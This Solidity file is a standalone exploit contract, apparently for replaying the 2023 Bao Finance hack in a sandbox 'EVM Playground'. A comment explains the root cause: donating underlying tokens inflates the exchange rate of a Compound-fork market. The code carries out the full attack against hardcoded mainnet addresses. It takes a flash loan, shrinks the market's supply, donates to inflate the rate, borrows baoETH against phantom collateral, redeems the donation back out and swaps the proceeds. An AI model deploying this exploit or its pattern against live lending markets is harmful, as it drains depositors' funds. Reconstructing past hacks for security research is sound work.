// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Bao).
//
// The DeFiHackLabs PoC (test/Bao_exp.sol) runs the whole attack INLINE in the
// Foundry `ContractTest is Test` contract (attacker = address(this); the Aave
// V2 flash-loan callback `executeOperation` lives on the test itself) -- there
// is no standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run ->
// executeOperation -> swapbaoETHToUSDCAndDAI) so the playground can deploy it
// and record run(). Logic, call order, and constants are copied verbatim from
// test/Bao_exp.sol.
//
// Root cause: Bao Finance's `bdbSTBL` market (a Compound v2 / CErc20 fork,
// CErc20Delegator -> CErc20Delegate) prices its cToken share (exchangeRate) as
// (cash + totalBorrows - totalReserves) / totalSupply, where `cash` is a live
// `underlying.balanceOf(cToken)` read -- NOT an internally-tracked
// accumulator (CToken.sol exchangeRateStoredInternal). A plain ERC20
// `transfer()` of the underlying (bSTBL) directly to the cToken therefore
// inflates the exchange rate with zero cTokens minted against it. Combined
// with (a) truncating integer division in mint/redeem and (b) no minimum
// supply / dead-shares protection, an attacker who first shrinks
// `totalSupply` down to a couple of wei-cTokens can donate a huge amount of
// underlying, instantly inflate the exchange rate by many orders of
// magnitude, borrow against the resulting phantom collateral from a
// cross-margined sibling market (bdbaoETH), then redeem the donation back out
// (costing only a truncated fraction of a cToken) -- keeping the borrowed
// funds while the "collateral" evaporates.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IbSTBL is IERC20 {
    function joinPool(uint256 poolAmountOut) external;
    function exitPool(uint256 poolAmountIn) external;
}

interface IbdbSTBL is IERC20 {
    function mint(uint256 mintAmount, bool enterMarket) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface ICErc20Delegate {
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IBalancerVault {
    enum SwapKind {
        GIVEN_IN,
        GIVEN_OUT
    }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        address assetIn;
        address assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256 amountCalculated);
}

interface Uni_Router_V3 {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactOutputSingle(
        ExactOutputSingleParams memory params
    ) external payable returns (uint256 amountIn);
}

contract BaoDrain {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 aUSDC = IERC20(0xBcca60bB61934080951369a648Fb03DF4F96263C);
    IERC20 aDAI = IERC20(0x028171bCA77440897B824Ca71D1c56caC55b68A3);
    IbSTBL bSTBL = IbSTBL(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8);
    IERC20 baoETH = IERC20(0xf4edfad26EE0D23B69CA93112eccE52704E0006f);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IbdbSTBL bdbSTBL = IbdbSTBL(0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e);
    ICErc20Delegate bdbaoETH = ICErc20Delegate(0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    function run() external {
        USDC.approve(address(AaveV2), type(uint256).max);
        DAI.approve(address(AaveV2), type(uint256).max);
        aUSDC.approve(address(bSTBL), type(uint256).max);
        aDAI.approve(address(bSTBL), type(uint256).max);
        bSTBL.approve(address(bdbSTBL), type(uint256).max);
        baoETH.approve(address(Balancer), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);

        address[] memory assets = new address[](2);
        assets[0] = address(USDC);
        assets[1] = address(DAI);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 17_550_000 * 1e6;
        amounts[1] = 17_510_000 * 1e18;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        AaveV2.deposit(address(USDC), amounts[0], address(this), 0);
        AaveV2.deposit(address(DAI), amounts[1], address(this), 0);
        bSTBL.joinPool(34_819_000 * 1e18 + 1); // mint bSTBL underlying token with aUSDC and aDAI

        bdbSTBL.mint(1, true); // mint 5 bdbSTBL from 1 wei of bSTBL (genesis exchange rate = 0.2)
        bdbSTBL.redeem(3); // redeem 3 bdbSTBL, leaving totalSupply = 2 bdbSTBL

        bSTBL.transfer(address(bdbSTBL), 34_819_000 * 1e18); // donate underlying token to inflate bdbSTBL exchangeRate
        bdbaoETH.borrow(41.3 ether);
        bdbSTBL.redeemUnderlying(34_819_000 * 1e18); // redeem almost all the donated underlying back out

        bSTBL.exitPool(34_819_000 * 1e18); // burn underlying token to get aUSDC and aDAI back

        AaveV2.withdraw(address(USDC), amounts[0] - 1, address(this));
        AaveV2.withdraw(address(DAI), amounts[1] - 1, address(this));

        swapbaoETHToUSDCAndDAI();
        return true;
    }

    function swapbaoETHToUSDCAndDAI() internal {
        IBalancerVault.SingleSwap memory singleSwap = IBalancerVault.SingleSwap({
            poolId: 0x1a44e35d5451e0b78621a1b3e7a53dfaa306b1d000000000000000000000051b,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: address(baoETH),
            assetOut: address(WETH),
            amount: baoETH.balanceOf(address(this)),
            userData: new bytes(0)
        });
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });
        Balancer.swap(singleSwap, funds, 39 ether, block.timestamp);

        Uni_Router_V3.ExactOutputSingleParams memory param1 = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 15_795 * 1e6 + 10,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(param1);
        Uni_Router_V3.ExactOutputSingleParams memory param2 = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(DAI),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: 15_759 * 1e18 + 10,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        Router.exactOutputSingle(param2);
    }
}
